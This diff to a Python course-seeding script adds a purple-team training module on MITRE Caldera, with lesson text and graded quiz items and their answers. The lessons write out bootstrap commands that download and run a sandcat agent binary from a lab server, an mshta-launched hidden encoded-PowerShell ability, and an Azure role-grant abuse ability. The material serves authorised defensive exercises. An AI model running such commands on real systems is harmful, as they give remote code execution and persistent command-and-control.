@@ -17658,7 +17658,1026 @@ Module 3 picks up: **MITRE Caldera operations** — server stand-up, plugin libr
         points=2,
     )
 
-    print(f"  L3: {course.title} — 2 modules, 16 lessons (Module 2 ART deep-dive @ proper depth)")
+    # ── Module 3 — MITRE Caldera operations ───────────────────────────
+    mod3 = _add_module(
+        session, course, order=3,
+        title="MITRE Caldera operations — server, sandcat, abilities, adversaries, operations",
+        description_md=(
+            "Caldera is the agent-based half of the L3 toolkit. M2 "
+            "covered ART (single-TTP, atomic-by-atomic). M3 covers "
+            "Caldera (chained, agent-driven, multi-host). The five "
+            "core concepts — server, agent, ability, adversary, "
+            "operation — and how they map onto ART vocabulary; "
+            "standing up the server via the canonical docker-compose; "
+            "deploying sandcat agents and the beacon mechanic; "
+            "authoring custom abilities and adversary profiles; "
+            "running operations with the four planner types; "
+            "orchestrating multi-host lateral chains via fact "
+            "propagation. The agent-removal-after rule (M1.5) is "
+            "load-bearing throughout."
+        ),
+        estimated_minutes=240,
+    )
+
+    # Lesson 3.1 — Caldera architecture
+    m3l1 = _add_lesson(
+        session, mod3, order=1,
+        title="Caldera architecture: server, agents, abilities, adversaries, operations",
+        lesson_type=LessonType.READING, duration_min=22,
+        content_md="""
+> **Learning objectives.**
+> 1. Recite the **five core concepts** of Caldera and how they relate
+> 2. Map each concept onto the **ART vocabulary** from M2
+> 3. Recognise when Caldera's **agent runtime + operation orchestration** layers earn their weight over plain ART
+> 4. Pick the right Caldera **agent flavour** (sandcat vs manx) for the exercise
+
+## The five core concepts
+
+Caldera's architecture has five layered concepts. The L3 must be precise with the vocabulary — *adversary* and *operation* are not the same thing.
+
+| Concept | What it is | ART analogue |
+|---|---|---|
+| **Server** | Aiohttp + Vue.js process; stores abilities, adversaries, operations, facts, results; serves the UI + agent API | (none — ART has no server) |
+| **Agent** | Native binary on the target host; beacons to server; picks up orders and reports results | (none — ART runs ad-hoc) |
+| **Ability** | One executable command (or short set) emulating one ATT&CK technique | Atomic test entry in `T<ID>.yaml` |
+| **Adversary** | Ordered list of abilities, optionally with fact-dependencies | AEL emulation plan |
+| **Operation** | Runtime instance: pick adversary, pick agents, run, observe | Hand-queued sequence of `Invoke-AtomicTest` calls |
+
+The relationship: **abilities are reusable building blocks; adversaries chain them; operations execute the chain on real hosts**.
+
+## How the layers earn their weight
+
+ART is sufficient for *single-TTP fidelity scoring*. Why does Caldera add agent + operation layers?
+
+1. **Chain timing**: real adversaries don't pause for SIEM verification between phases. Caldera runs an end-to-end campaign at agent-beacon cadence (60s typical), letting the SOC measure its *real* response time. ART runs each test in isolation; cleanup between tests breaks the chain timing.
+
+2. **Multi-host orchestration**: real lateral movement starts on host A, pivots to host B, exfil from host C. ART runs on one host at a time. Caldera's agents on multiple hosts coordinate via the server's fact set.
+
+3. **Fact-driven dependencies**: ability 1 discovers a credential, ability 2 uses it. ART has no way to express this; the operator hand-edits the next test's input. Caldera's *facts* propagate between abilities automatically.
+
+4. **Centralised reporting**: every Caldera operation produces a report (timing, success/fail per ability, facts collected, ATT&CK coverage). ART produces ad-hoc per-test scorecard rows that the L3 must aggregate manually.
+
+5. **Operation pause / resume**: a multi-day campaign that the L3 wants to throttle — Caldera supports operation pause/resume; ART has no analogue.
+
+## When Caldera over ART
+
+Decision rules from the M1.5 reminder:
+
+| Scenario | Tool |
+|---|---|
+| Single TTP, scorecard-driven | **ART** |
+| Chained TTPs (T1078 → T1003 → T1059 → T1486) | **Caldera** |
+| Long-running campaign (drip activity over days) | **Caldera** |
+| Multi-host lateral movement | **Caldera** |
+| Air-gapped or sensitive estate where no agent is welcome | **ART** |
+| Emulating a *named actor* end-to-end | **Caldera** |
+
+Mature programs use both. ART for granular fidelity; Caldera for chain + response timing.
+
+## Two agent flavours: sandcat vs manx
+
+| Agent | Type | When |
+|---|---|---|
+| **sandcat** | Native Go binary (canonical) | Default — multi-platform, beacon-driven, full feature set |
+| **manx** | Reverse-shell handler | Niche — air-gapped or low-privilege scenarios where a callback shell is what you have |
+
+Other community agents exist (Ragdoll, etc.); for L3 work, sandcat covers ~95% of cases.
+
+## Worked: ART vs Caldera on the same FIN6 chain
+
+(Recap from M2.6 — the FIN6 12-phase chain.)
+
+**ART approach**: 12 separate `Invoke-AtomicTest` calls, one per phase. Cleanup between each. Each phase's result is its own scorecard row. Total wall time: 30-60 minutes (mostly cleanup overhead between atomics).
+
+**Caldera approach**: one operation with the FIN6 adversary profile. Sandcat agents on initial / lateral / impact hosts. Server runs the chain end-to-end at beacon cadence. Total wall time: 5-10 minutes. Result: one operation report with timing per ability + total chain time + facts collected.
+
+Same TTPs. Different shapes. The L3 picks based on what the exercise is measuring:
+- ART → *what TTPs do my detections fire on?*
+- Caldera → *how fast does my SOC respond to a chain?*
+
+Both are valuable; the L3's full toolkit has both.
+
+## Glossary
+
+- **Server** — Caldera's aiohttp + Vue.js process, port 8888 default.
+- **Sandcat** — canonical Caldera agent (Go, multi-platform, beacon-driven).
+- **Manx** — reverse-shell agent for air-gapped scenarios.
+- **Ability** — one ATT&CK technique encoded as one executable command.
+- **Adversary** — ordered list of abilities; named actor's chain.
+- **Operation** — runtime instance of an adversary against a set of agents.
+
+## Further reading
+
+- Caldera architecture docs — https://caldera.readthedocs.io/en/latest/Architecture.html.
+- MITRE Engenuity blog — *Caldera vs Atomic Red Team*.
+""",
+    )
+    _add_q(session, m3l1, order=1, kind=QuestionKind.SINGLE,
+        stem_md="The L3 receives a sentence: *\"We ran the FIN6 _____ on PT-LAB-04 and PT-LAB-05 yesterday and it took 7 minutes end-to-end.\"* Pick the correct Caldera term to fill the blank.",
+        options=[
+            {"value": "ability", "label": "ability — one ATT&CK technique"},
+            {"value": "adversary", "label": "adversary — the named-actor chain definition"},
+            {"value": "operation", "label": "operation — the runtime instance of an adversary on real agents"},
+            {"value": "agent", "label": "agent — the sandcat process on the target host"},
+        ],
+        correct="operation",
+        explanation_md="**Operation.** The sentence describes a *runtime execution*: which agents (PT-LAB-04, -05), how long it took, what completed. That's an operation. An *adversary* is the static chain definition (e.g. \"FIN6 Compressed\"); an *operation* is the run. *Ability* is one technique step; *agent* is the sandcat process. The L3's reflex: *adversary = recipe; operation = the cooking event*. Both names appear in the Caldera UI's left nav as separate sections; the operation report attributes results to the originating adversary.",
+        points=2,
+    )
+
+    # Lesson 3.2 — Standing up the server
+    m3l2 = _add_lesson(
+        session, mod3, order=2,
+        title="Standing up the Caldera server: docker-compose, plugins, initial config",
+        lesson_type=LessonType.READING, duration_min=18,
+        content_md="""
+> **Learning objectives.**
+> 1. Run the **canonical docker-compose** with the `--recursive` git clone
+> 2. Recognise the canonical **plugin set** (stockpile / sandcat / atomic / compass / debrief)
+> 3. Rotate the **default credentials** (`red / admin`) before any production-mirror exercise
+> 4. Configure the agent-server **contact channels** appropriate to the network posture
+
+## The canonical install
+
+```bash
+# Clone with --recursive — Caldera's plugins are git submodules
+git clone https://github.com/mitre/caldera.git --recursive
+cd caldera
+
+# Bring up the server
+docker compose up -d
+
+# UI at http://localhost:8888
+# Default login: red / admin
+```
+
+The `--recursive` flag is critical. Without it, `caldera/plugins/<name>` directories are empty — no abilities, no adversaries, no agent binaries. Many first-time installers miss this and the server starts but the UI is mostly empty.
+
+If you cloned without `--recursive`, recover with:
+
+```bash
+cd caldera
+git submodule update --init --recursive
+```
+
+## The canonical plugin set
+
+Plugins live under `plugins/<name>/`. The default `conf/local.yml` (or `conf/default.yml`) loads a subset at server start:
+
+```yaml
+plugins:
+  - access
+  - atomic
+  - compass
+  - debrief
+  - fieldmanual
+  - manx
+  - response
+  - sandcat
+  - ssl
+  - stockpile
+  - training
+```
+
+For purple-team programs, the *working set* is:
+
+| Plugin | Purpose |
+|---|---|
+| **stockpile** | Vetted ability and adversary library — the canonical content |
+| **sandcat** | Sandcat agent's source + cross-compile pipeline |
+| **atomic** | Bridges ART YAML into Caldera ability format (M2 L6 cross-link to AEL) |
+| **compass** | ATT&CK Navigator-overlay generation per operation |
+| **debrief** | Operation report / scorecard renderer |
+| **manx** | Reverse-shell agent (niche, see L3.1) |
+| **response** | Autonomous *defender* responses for blue-team testing |
+
+Less-essential for L3 daily work but worth knowing:
+- **fieldmanual** — Caldera's own user docs.
+- **training** — built-in tutorial walking through a basic operation.
+- **access** — shows GUI access controls; rarely modified.
+- **ssl** — TLS termination if not behind a reverse proxy.
+
+## Default credentials — rotate before production-mirror
+
+Every fresh install ships with `red:admin` and `blue:admin`. **Rotate both before any exercise on a production-mirror host.** The default credentials are public knowledge; if your Caldera server's port is reachable from the broader estate (or an attacker compromises an unrelated host that can reach it), the defaults are a free C2 for them.
+
+Edit `conf/local.yml`:
+
+```yaml
+users:
+  red:
+    red: '<new-strong-password-1>'
+  blue:
+    blue: '<new-strong-password-2>'
+```
+
+Restart the server. The next login uses the new password. Document the rotation in your secrets store; lost passwords require config-file edits to recover.
+
+## Contact channels
+
+Caldera supports five agent-server contact channels:
+
+| Channel | Default port | When |
+|---|---|---|
+| **HTTP** | 8888 | Default; works in most networks |
+| **TCP** | 7010 | Lower overhead than HTTP; useful when egress allows arbitrary TCP |
+| **UDP** | 7011 | Niche — connectionless beacon |
+| **GIST** | (GitHub Gist API) | Air-gap-friendly; uses public Gist as a dead-drop |
+| **DNS-tunnelling** | 53 | Egress is ultra-restricted; uses TXT records |
+
+The agent's deploy command picks the channel via the `-server` URL scheme:
+
+- `http://caldera:8888` → HTTP
+- `tcp://caldera:7010` → TCP
+- `gist://...` → GIST
+
+Most lab setups use HTTP. For exercises emulating actors that use exotic C2 (DNS tunnelling), match the actor's channel choice to make the exercise realistic.
+
+## Validating the install
+
+Three checks after first server start:
+
+1. UI loads at `http://localhost:8888` — login with rotated creds.
+2. **Plugins → stockpile** — should list ~50 abilities and ~6 adversaries.
+3. **Agents → Deploy an agent** — should generate platform-specific bootstrap commands.
+
+If any check fails, the typical cause is missing submodules. `git submodule update --init --recursive` and restart.
+
+## Resource limits
+
+Caldera's server is light (~500 MB RAM, ~1 CPU at idle). Memory grows with operation history; long-running labs might hit 2-3 GB after a few weeks. Set the docker-compose memory limit to 4 GB to be safe.
+
+## Glossary
+
+- **`--recursive` clone** — pulls plugin submodules; mandatory.
+- **`conf/local.yml`** — operator-edited config; overrides `default.yml`.
+- **Working plugin set** — stockpile + sandcat + atomic + compass + debrief.
+- **Default credentials** — `red:admin` / `blue:admin`; MUST rotate.
+
+## Further reading
+
+- Caldera install docs — https://caldera.readthedocs.io/en/latest/Installing-Caldera.html.
+- Plugin documentation — https://github.com/mitre/caldera/blob/master/docs/Plugin-library.md.
+""",
+    )
+    _add_q(session, m3l2, order=1, kind=QuestionKind.SHORTANSWER,
+        stem_md="On the canonical Caldera docker-compose install (no reverse proxy), what's the **default URL** of the server's web UI? Format: `http(s)://<host>:<port>`.",
+        options=None,
+        correct=[
+            "http://localhost:8888",
+            "http://localhost:8888/",
+            "http://127.0.0.1:8888",
+            "http://127.0.0.1:8888/",
+        ],
+        explanation_md="**`http://localhost:8888`** is the default. Caldera's UI binds port 8888 inside the container; the docker-compose maps it to the host. Default credentials are `red:admin` (must be rotated before any exercise on production-mirror hosts; see L3.2). For HTTPS, the `ssl` plugin or an external reverse proxy provides termination — neither is on by default. Note: production deployments commonly put Caldera behind nginx + TLS for browser users; the *agent-to-server* contact channel is separate and configurable (HTTP / TCP / GIST / DNS).",
+        points=2,
+    )
+
+    # Lesson 3.3 — Sandcat agent
+    m3l3 = _add_lesson(
+        session, mod3, order=3,
+        title="Sandcat agent: deploying agents and the beacon mechanic",
+        lesson_type=LessonType.READING, duration_min=22,
+        content_md="""
+> **Learning objectives.**
+> 1. Deploy a **sandcat agent** to Windows / Linux / macOS via the UI's bootstrap command
+> 2. Recognise the **beacon mechanic**: paw / group / platform / contact channel
+> 3. Configure **jitter** to match exercise realism
+> 4. Apply the **agent-removal-after rule** at exercise end with verification
+
+## What sandcat is
+
+Sandcat is a single Go binary, cross-compiled for Windows / Linux / macOS / FreeBSD. The Caldera server's `/file/download` endpoint serves the binary on demand, with the `platform` HTTP header telling the server which cross-compile to return.
+
+The binary, when run, beacons to a configured server URL at randomised intervals. Each beacon is a single HTTP POST (default channel) carrying agent metadata + collected facts; the server responds with any pending orders.
+
+## Deploying sandcat
+
+The Caldera UI's *Agents → Deploy an agent* page generates a one-line bootstrap command per platform.
+
+**Windows PowerShell** (rendered with placeholders):
+
+```powershell
+$server="http://caldera.lab:8888"
+$url="$server/file/download"
+$wd=New-Item -Type Directory ($env:TEMP + "\\sc-" + (Get-Random)) -Force
+$wc=New-Object Net.WebClient
+$wc.Headers.add("platform","windows")
+$wc.Headers.add("file","sandcat.go")
+$wc.DownloadFile($url, $wd.FullName + "\\sandcat.exe")
+Start-Process -FilePath ($wd.FullName + "\\sandcat.exe") `
+  -ArgumentList "-server","$server","-group","red"
+```
+
+**Linux bash**:
+
+```bash
+server="http://caldera.lab:8888"
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/sandcat
+chmod +x /tmp/sandcat
+/tmp/sandcat -server $server -group red &
+```
+
+**macOS** (similar to Linux but `platform:darwin`).
+
+After launch, the agent appears in the Caldera UI's *Agents* section within one beacon interval (default 60s).
+
+## The beacon mechanic
+
+Each beacon is a small HTTPS request (or HTTP, TCP, etc. depending on contact channel). Payload:
+
+| Field | Purpose |
+|---|---|
+| `paw` | Agent UUID; assigned by server on first beacon |
+| `group` | Logical grouping (`red`, `blue`, `engineering`, etc.) |
+| `platform` | Auto-detected (windows / linux / darwin) |
+| `host` | Hostname |
+| `contact` | The channel agent is using |
+| `pid` | Sandcat process id |
+| `username` | User context the agent runs as |
+
+The server responds with **pending orders** if any: a JSON list of abilities the planner has decided this agent should run next. Sandcat executes them, captures stdout/stderr/exit code, and reports back on the next beacon.
+
+Beacon cadence:
+- Default: **60s ± 20% jitter**.
+- Configurable via `-c2Period <seconds>` flag at agent launch.
+- The jitter masks beacon timing — without it, the agent's beacons are perfectly periodic and trivial to detect (M7 L7.3 cross-link — beacon CV).
+
+For exercise realism, **set jitter high enough that interval-CV detection isn't trivial**. A 60s ± 50% jitter means CV ≈ 0.29 — at the edge of beacon-detection thresholds. The L3 testing the SOC's beacon-detection rule (M7) sets jitter to test the rule's sensitivity boundary.
+
+## Agent identity
+
+The **paw** is the agent's UUID, assigned by the server on first beacon. The agent persists this in memory only; killing and restarting the same binary creates a fresh paw.
+
+The **group** is operator-set at launch (`-group red`). Use groups to disambiguate exercises:
+
+- `red-initial` — agents on initial-access targets.
+- `red-lateral` — agents on lateral targets.
+- `red-impact` — agents on impact targets.
+
+Operations target groups; the L3 picks "all of red-*" or specific subsets per exercise.
+
+## Stopping + removing agents
+
+Three options:
+
+1. **UI Agents → Kill** — sends a remote-kill command on next beacon. Agent exits; binary on disk persists.
+2. **Local kill** — `Stop-Process -Id <pid>` on Windows, `kill <pid>` on Linux.
+3. **Reboot** — sandcat is in-memory only; reboot kills it.
+
+Binary on disk persists past kill. The L3 must explicitly remove:
+
+```powershell
+# Windows post-kill cleanup
+Remove-Item -Path "$env:TEMP\\sc-*" -Recurse -Force
+```
+
+```bash
+# Linux post-kill cleanup
+rm -f /tmp/sandcat
+rm -rf /tmp/sc-*
+```
+
+The **agent-removal-after rule** (M1.5): every Caldera exercise's authorisation includes the agent removal step. After kill, verify:
+- Process list — no sandcat process running.
+- Filesystem — no leftover binaries / directories.
+- Persistence — sandcat default has no persistence, but if the operator ran an `Persistence` ability through it, that artefact may persist independently.
+
+## Worked: 3-host deploy + cleanup verification
+
+The L3 plans a multi-host operation. Pre-exercise:
+
+1. Deploy sandcat to PT-LAB-04 (initial), PT-LAB-05 (lateral), PT-LAB-06 (impact).
+2. Group: `red-initial`, `red-lateral`, `red-impact`.
+3. Operation: FIN6 chain.
+
+Post-exercise (mandatory):
+4. UI: Agents → Kill all three.
+5. SSH to each host: confirm sandcat process gone (`pgrep sandcat` returns nothing).
+6. Filesystem: confirm `/tmp/sandcat` and `/tmp/sc-*` removed.
+7. Reboot the host (belt-and-braces; in-memory residuals all gone).
+8. Document in the exercise log: agent install, run, kill, cleanup verification.
+
+## Glossary
+
+- **Sandcat** — Go binary; canonical Caldera agent.
+- **Paw** — agent UUID; server-assigned.
+- **Group** — operator-set logical grouping.
+- **Beacon cadence** — default 60s ± 20% jitter; configurable via `-c2Period`.
+- **Agent-removal-after** — kill + filesystem-clean + verify; mandatory at exercise end.
+
+## Further reading
+
+- Sandcat source — `caldera/plugins/sandcat/`.
+- Caldera agent docs — https://caldera.readthedocs.io/en/latest/learning-the-terminology.html#agents.
+""",
+    )
+    _add_q(session, m3l3, order=1, kind=QuestionKind.MULTI,
+        stem_md="Which of the following are *valid* sandcat agent-server contact channels?",
+        options=[
+            {"value": "http", "label": "HTTP — port 8888 default"},
+            {"value": "tcp", "label": "TCP — direct socket"},
+            {"value": "gist", "label": "GIST — GitHub Gist as a dead-drop"},
+            {"value": "dns", "label": "DNS-tunnelling — TXT records"},
+            {"value": "udp", "label": "UDP — connectionless beacon"},
+            {"value": "smtp", "label": "SMTP — email-based C2"},
+            {"value": "ftp", "label": "FTP — file-based dead-drop"},
+        ],
+        correct=["http", "tcp", "gist", "dns", "udp"],
+        explanation_md="The five valid channels are HTTP (default), TCP, GIST (GitHub Gist dead-drop, useful for air-gap exercises), DNS-tunnelling (egress-restricted estates), and UDP (connectionless niche). SMTP and FTP are *not* canonical Caldera channels (they exist as community contributions but aren't in mainline). The L3's reflex: pick the channel that matches the actor being emulated. Real APT29 used DNS-tunnelling for one campaign; emulating them well includes setting sandcat's contact to DNS so the SOC's DNS-based detection is exercised.",
+        points=3,
+    )
+
+    # Lesson 3.4 — Custom abilities
+    m3l4 = _add_lesson(
+        session, mod3, order=4,
+        title="Authoring custom abilities: YAML, fact substitution, requirements",
+        lesson_type=LessonType.READING, duration_min=22,
+        content_md="""
+> **Learning objectives.**
+> 1. Author a **custom ability YAML** with platform / executor / command / cleanup
+> 2. Use **`#{var}` fact substitution** to parameterise abilities at run time
+> 3. Author **requirements** that constrain when an ability can run
+> 4. Load custom abilities via a **plugin's `data/abilities/` folder**
+
+## YAML format walkthrough
+
+```yaml
+- id: 12345678-90ab-cdef-1234-567890abcdef
+  name: Mshta executes encoded PowerShell
+  description: |
+    Launches mshta with vbscript that invokes PowerShell with an
+    encoded command. Emulates the FIN6 / Conti launcher pattern.
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: Command and Scripting Interpreter — PowerShell
+  platforms:
+    windows:
+      psh:
+        command: |
+          mshta vbscript:CreateObject("Wscript.Shell").Run("powershell.exe -nop -w hidden -enc #{payload}")(window.close)
+        cleanup: |
+          # No persistence; cleanup is a no-op
+        timeout: 60
+  requirements:
+    - plugins.stockpile.requirements.basic:
+        - source: payload
+          edge: has_payload
+```
+
+| Field | Purpose |
+|---|---|
+| `id` | UUID; unique across the whole library. Generate with `uuidgen` / `[guid]::NewGuid()`. |
+| `name` / `description` | Human readers — the UI surfaces both |
+| `tactic` | ATT&CK tactic in kebab-case (`command-and-control`, `credential-access`, etc.) |
+| `technique.attack_id` | ATT&CK technique id (T1059.001 etc.) |
+| `platforms.<platform>.<executor>` | Per-platform-per-executor command + cleanup + timeout |
+| `requirements` | Facts that must be present before the ability can run |
+
+## Per-platform / per-executor structure
+
+`platforms` is a nested map. Top level is platform; second level is executor. Executors:
+
+- **`psh`** — PowerShell on Windows.
+- **`cmd`** — Windows command prompt.
+- **`sh`** — POSIX shell on Linux / macOS.
+- **`bash`** — bash on Linux / macOS.
+- **`pwsh`** — PowerShell-Core (cross-platform).
+- **`elevated`** — variant requiring admin / root.
+
+Multiple executors per platform = the planner picks the first that matches what's available on the agent. For maximum portability, ship `psh` + `cmd` for Windows and `sh` for Linux.
+
+## Fact substitution: `#{var}`
+
+Caldera operations carry a *fact set* — facts collected during the operation that subsequent abilities can read. The `#{var}` syntax in an ability's command is a fact placeholder.
+
+```yaml
+command: |
+  mshta vbscript:Run("powershell.exe -enc #{payload}")(window.close)
+```
+
+At runtime, Caldera substitutes `#{payload}` with a value from the fact set. The fact must exist; if not, the ability is *skipped* until something produces it.
+
+Facts are produced by previous abilities. For example, an ability that runs `whoami` and parses output emits `host.user.name` facts; subsequent abilities can use `#{host.user.name}`.
+
+## Requirements: when can the ability run?
+
+The `requirements` block expresses fact dependencies:
+
+```yaml
+requirements:
+  - plugins.stockpile.requirements.basic:
+      - source: payload
+        edge: has_payload
+```
+
+Means: this ability can run only if the operation's fact set has *at least one* fact whose source is `payload` and edge is `has_payload`.
+
+Common requirement patterns:
+
+- **Required fact set**: ability needs `host.user.name` and `host.ip` together to run.
+- **Excluded fact set**: ability runs once per host; require `not host.has_run_this`.
+- **Conditional logic**: ability runs only on agents in `linux` group with elevation.
+
+## Loading custom abilities
+
+Drop the YAML in a plugin's data folder:
+
+```
+plugins/<plugin-name>/data/abilities/<tactic>/<id>.yml
+```
+
+For org-internal abilities, create a custom plugin (`mkdir -p plugins/org-internal/{data/abilities/execution,hook.py}`), point at it from `conf/local.yml`, restart server.
+
+The plugin loader picks them up on next start. The UI's *Abilities → Library* shows the new entry with the `tactic` filter.
+
+## Worked: a custom ability for sector-specific service-principal abuse
+
+Carries forward the M2.3 example into Caldera form:
+
+```yaml
+- id: 7b8e9c45-1234-4def-9876-543210fedcba
+  name: Org-specific SP role-grant abuse
+  description: |
+    Abuse the org-specific service-principal naming convention to
+    grant elevated permissions on a target SP. Calibrated to FIN6
+    cloud-account abuse patterns.
+  tactic: persistence
+  technique:
+    attack_id: T1098.003
+    name: Account Manipulation — Additional Cloud Roles
+  platforms:
+    windows:
+      psh:
+        command: |
+          $sp = Get-AzADServicePrincipal -DisplayName "#{target_sp}"
+          New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionName "#{role_name}" -Scope "/"
+          Write-Host "Granted #{role_name} to $($sp.DisplayName)"
+        cleanup: |
+          $sp = Get-AzADServicePrincipal -DisplayName "#{target_sp}"
+          Get-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionName "#{role_name}" |
+            Remove-AzRoleAssignment
+        timeout: 120
+  requirements:
+    - plugins.stockpile.requirements.basic:
+        - source: target_sp
+          edge: has_target_sp
+    - plugins.stockpile.requirements.basic:
+        - source: role_name
+          edge: has_role_name
+```
+
+The operation provides `target_sp` and `role_name` facts at start (via the *Facts* section); the ability runs once per matching fact tuple.
+
+## Glossary
+
+- **Ability YAML** — defines one ATT&CK technique step; lives at `plugins/<x>/data/abilities/<tactic>/<id>.yml`.
+- **Fact substitution** — `#{var}` in command body is replaced at runtime from the operation's fact set.
+- **Requirement** — gate on whether an ability can run, expressed as fact dependencies.
+- **Per-platform per-executor structure** — `platforms.<windows/linux>.<psh/cmd/sh>` map.
+
+## Further reading
+
+- Caldera ability docs — https://caldera.readthedocs.io/en/latest/learning-the-terminology.html#abilities.
+- stockpile abilities — `plugins/stockpile/data/abilities/` for examples.
+""",
+    )
+    _add_q(session, m3l4, order=1, kind=QuestionKind.SINGLE,
+        stem_md="An L3 reads a Caldera ability whose YAML carries `tactic: credential-access` and `technique.attack_id: T1003.001`. What's the canonical ATT&CK *tactic* this ability is mapped to?",
+        options=[
+            {"value": "ta0006", "label": "TA0006 — Credential Access"},
+            {"value": "ta0009", "label": "TA0009 — Collection"},
+            {"value": "ta0001", "label": "TA0001 — Initial Access"},
+            {"value": "ta0003", "label": "TA0003 — Persistence"},
+        ],
+        correct="ta0006",
+        explanation_md="**TA0006 — Credential Access.** The YAML's `tactic` field is `credential-access` (kebab-case representation of the canonical TA0006 tactic). T1003.001 — LSASS Memory Dumping — is the technique under that tactic. Caldera uses kebab-case for tactics (`credential-access`, `command-and-control`, `lateral-movement`, etc.) for YAML readability; the canonical id (TA####) is implicit. The L3 reads `tactic` to route the alert / scorecard row to the right kill-chain step (M1.5 cross-link — primary tactic + response leverage).",
+        points=2,
+    )
+
+    # Lesson 3.5 — Adversary profiles
+    m3l5 = _add_lesson(
+        session, mod3, order=5,
+        title="Adversary profiles: chained abilities, atomic_ordering, fact dependencies",
+        lesson_type=LessonType.READING, duration_min=20,
+        content_md="""
+> **Learning objectives.**
+> 1. Author an **adversary profile YAML** with `atomic_ordering`
+> 2. Recognise **fact dependencies** that wire abilities together
+> 3. Map the **MITRE Adversary Emulation Library** plans to Caldera adversaries
+> 4. Use the **`atomic` plugin** to bridge ART YAML into Caldera abilities
+
+## Adversary YAML format
+
+```yaml
+- id: 5d3e170e-f1a8-49a2-bc4f-6e9d2c8a3f1d
+  name: FIN6 Compressed
+  description: |
+    Compressed end-to-end FIN6 chain — initial-access through impact.
+    Based on MITRE Adversary Emulation Library FIN6 plan, condensed
+    for L3 purple-team exercises.
+  atomic_ordering:
+    - 0e58a3f8-6d4d-4f3e-9e8a-1c7b2d0a9f3c   # T1566.001 spearphishing-attachment
+    - 1c3f5e9c-0c4b-4f5e-9c0c-4b4f5e9c0c4b   # T1059.001 mshta encoded PS
+    - 8e3a5d2f-4c1b-49e6-bf78-2d3c5e9f1a4b   # T1547.001 registry Run key
+    - a1b2c3d4-5e6f-4789-abcd-ef0123456789   # T1003.001 LSASS dump
+    - b2c3d4e5-6f78-4a9b-cdef-1234567890ab   # T1018 net group enumeration
+    - c3d4e5f6-789a-4bcd-ef01-2345678901bc   # T1021.002 SMB lateral
+    - d4e5f6a7-89ab-4cde-f012-3456789012cd   # T1071.001 HTTPS C2
+    - e5f6a7b8-9abc-4def-0123-456789012def   # T1486 file encryption sandbox
+```
+
+`atomic_ordering` is a flat list of ability UUIDs. Caldera's planner runs them — order depends on planner type (L3.6).
+
+## Fact dependencies wire abilities together
+
+`atomic_ordering` is sequential in the YAML, but the *runtime* order depends on facts. Two abilities in sequence can swap if their fact dependencies allow it.
+
+Example chain:
+
+- **Ability 5** (T1018 — net group): emits `host.user.name` facts when discovering admin users.
+- **Ability 6** (T1021.002 — SMB lateral): requires `host.user.name` to identify the target session user.
+
+The planner sees: ability 6's requirement is satisfied by ability 5's output. Schedules accordingly. If ability 5 fails to find admins, ability 6 is *skipped*.
+
+## Bridging ART → Caldera via the `atomic` plugin
+
+The `atomic` plugin (loaded by default) auto-imports ART YAML into Caldera ability format. The bridge:
+
+- Reads `redcanaryco/atomic-red-team` repo (cloned alongside Caldera).
+- Parses each `T<ID>.yaml` and emits a Caldera ability per `atomic_tests` entry.
+- Tags abilities with the source ART test number for traceability.
+
+The L3's adversary YAML can reference these auto-generated UUIDs by id. The `atomic` plugin keeps a stable id mapping across Caldera restarts.
+
+This means: any ART atomic from the public library is instantly available as a Caldera ability. Custom-authored ART atomics (M2.3) are also picked up if they live in the `atomic-red-team/atomics/` folder Caldera reads from.
+
+## Worked: building a custom adversary
+
+The L3 wants to model a sector-specific actor whose chain is:
+1. T1566.002 — spearphishing-link.
+2. T1078.004 — cloud-account abuse (custom ability from M3.4).
+3. T1098.003 — additional cloud roles (custom ability from M3.4).
+4. T1530 — cloud storage object access.
+5. T1567.002 — exfil to cloud storage.
+
+Adversary YAML:
+
+```yaml
+- id: <fresh-uuid>
+  name: Org-specific cloud-takeover chain
+  description: |
+    Sector-specific cloud-takeover emulation. Matches the chain
+    seen in 2026 Q1 sector-ISAC reports.
+  atomic_ordering:
+    - <T1566.002 stockpile ability uuid>
+    - <T1078.004 custom ability uuid>
+    - <T1098.003 custom ability uuid>
+    - <T1530 stockpile ability uuid>
+    - <T1567.002 stockpile ability uuid>
+```
+
+Save to `plugins/org-internal/data/adversaries/<id>.yml`, restart server. The UI's *Adversaries* section now shows it. Run via *Operations → Add operation → Adversary: Org-specific cloud-takeover chain*.
+
+## Authoring tips
+
+- **One adversary per actor**, not one per chain variant. Variations live as separate adversaries with shared abilities.
+- **Document the chain's source** in `description` — CTI report id, AEL plan reference, sector-ISAC bulletin date.
+- **Pin to ATT&CK version** in description — chains drift as ATT&CK updates.
+- **Test custom adversaries** end-to-end on a snapshot host before running on a production-mirror.
+
+## Glossary
+
+- **Adversary** — chain definition; ordered list of abilities.
+- **`atomic_ordering`** — flat list of ability UUIDs.
+- **Fact-driven planning** — the runtime planner reorders abilities based on fact availability.
+- **`atomic` plugin** — bridges ART YAML into Caldera abilities.
+
+## Further reading
+
+- Caldera adversary docs — https://caldera.readthedocs.io/en/latest/learning-the-terminology.html#adversaries.
+- MITRE Engenuity AEL — https://github.com/center-for-threat-informed-defense/adversary_emulation_library.
+""",
+    )
+    _add_q(session, m3l5, order=1, kind=QuestionKind.SHORTANSWER,
+        stem_md="A Caldera deployment auto-imports Atomic Red Team YAML files into Caldera ability format on server start. Which **plugin** owns this bridge? Format: a single plugin name.",
+        options=None,
+        correct=[
+            "atomic",
+            "Atomic",
+            "ATOMIC",
+            "atomic plugin",
+        ],
+        explanation_md="**`atomic`** is the plugin name. It's loaded by default in `conf/default.yml`'s plugins list (alongside stockpile, sandcat, compass, debrief, etc.). The bridge reads the cloned `redcanaryco/atomic-red-team` repo, parses each `T<ID>.yaml`'s `atomic_tests` array, and emits a Caldera ability per test with a stable id mapping. This means: every public ART atomic is available as a Caldera ability without rewriting; the L3 references them by UUID in adversary YAML's `atomic_ordering`. Custom ART atomics authored per M2.3 are also picked up as long as they live in the configured atomics folder. Note: there's also a `stockpile` plugin (Caldera-native vetted abilities) — a different surface from atomic-bridged ART abilities.",
+        points=2,
+    )
+
+    # Lesson 3.6 — Operations + planners
+    m3l6 = _add_lesson(
+        session, mod3, order=6,
+        title="Operations: launching, the four planners, the operation report",
+        lesson_type=LessonType.READING, duration_min=22,
+        content_md="""
+> **Learning objectives.**
+> 1. Launch an **operation** — pick adversary, agents, planner
+> 2. Pick the right **planner** for the chain shape: `batch` / `atomic` / `buckets` / `look`
